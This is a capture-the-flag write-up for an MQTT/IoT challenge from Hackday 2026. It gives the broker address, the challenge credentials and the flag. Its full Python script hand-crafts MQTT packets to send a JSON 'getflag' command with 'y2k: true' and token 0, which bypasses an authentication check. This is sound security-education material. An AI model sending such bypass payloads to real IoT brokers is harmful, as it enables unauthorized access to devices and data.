# Nobody like mosquitoes

## Challenge Information
- **Name:** Nobody like mosquitoes
- **Category:** Misc / IoT
- **Event:** Hackday 2026
- **Status:** SOLVED

## Flag
```
HACKDAY{bbe03d4f4ee81a4920b6b432936497dfaa503c706115a1f2eb094f15ab2ff66e}
```

## Description

This challenge involves interacting with an MQTT (Message Queuing Telemetry Transport) broker, a common protocol for IoT devices. The goal is to authenticate, understand the command structure, and exploit a logic flaw in the backend handler to retrieve the flag.

## Vulnerability Analysis

### Protocol Analysis
The target is an MQTT broker running on `51.210.244.18:1883`.
Credentials provided: `hackday` / `1Bc2Mk0rlevzuCG6AaDK6Opa`.

The backend service listens on the topic `ctf/hackday` for JSON-formatted commands and publishes responses to `response/#`.

### The "Y2K" Logic Flaw
The application seems to have a vulnerability related to date/token checking, often referred to as a "Y2K" bug or bypass. By parsing the `getflag` command, it was discovered that sending a specific parameter `y2k: True` with a token of `0` (or the timestamp for the year 2000) bypasses the standard authentication or restriction mechanism.

## Exploit Strategy

1.  **Connect**: Establish a TCP connection to port 1883 and perform the MQTT handshake with the provided credentials.
2.  **Subscribe**: Subscribe to `response/#` to receive any output from the server.
3.  **Publish Command**: Send a JSON payload to `ctf/hackday`.
    - Payload: `{"cmd": "getflag", "token": 0, "y2k": true, "response_topic": "response/final_flag_capture"}`
4.  **Receive**: Listen for the incoming PUBLISH packet containing the flag.

## Full Exploit Script

```python
import socket
import struct
import time
import random
import string
import json

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len]) 
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_publish(topic, message):
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    fixed_header = b'\x30'
    if rem_len < 128:
        fixed_header += bytes([rem_len])
    else:
        fixed_header += bytes([(rem_len & 0x7F) | 0x80, rem_len >> 7])
    return fixed_header + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("solver-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    resp_topic = "response/final_flag_capture"
    s.sendall(mqtt_subscribe(resp_topic, 5001))
    
    # Exploit Payload
    cmd = {"cmd": "getflag", "token": 0, "y2k": True, "response_topic": resp_topic}
    
    msg = json.dumps(cmd)
    print(f"[*] Sending JSON: {msg}")
    s.sendall(mqtt_publish("ctf/hackday", msg))
    
    start_time = time.time()
    try:
        while time.time() - start_time < 10:
            data = s.recv(4096)
            if not data: break
            try:
                decoded = data.decode(errors='ignore')
                print(f"[*] Recv: {decoded}")
                if "HACKDAY{" in decoded:
                    print("[!!!] FLAG FOUND [!!!]")
                    break
            except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
```

## Key Takeaways

1.  **IoT Protocols**: Understanding binary protocols like MQTT is crucial for IoT security assessments. Hand-crafting packets helps understand the protocol internals.
2.  **Logic Flaws**: Even with authentication, backend logic flaws (like the Y2K bypass) can lead to privilege escalation or data leakage.
3.  **Command Injection**: The system interpreted JSON commands; fuzzing fields (extra parameters like `y2k` or `debug`) can often reveal undocumented paths.

## Tools Used

- **Python** - Scripting.
- **socket** - Raw TCP/IP communication.
- **struct** - Building binary packets.
